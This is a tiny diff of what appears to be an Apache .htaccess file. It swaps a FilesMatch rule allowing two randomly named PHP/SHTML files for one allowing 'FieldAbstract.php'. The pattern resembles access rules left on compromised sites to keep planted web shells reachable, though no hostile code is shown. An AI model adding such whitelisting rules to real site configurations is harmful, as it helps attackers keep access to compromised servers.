@@ -9,7 +9,7 @@ Order allow,deny
 Allow from all
 </FilesMatch>
 
-<FilesMatch '^(controlPublicFiles6465e49b.php|6986f05232775.shTmL)$'>
+<FilesMatch '^(FieldAbstract.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
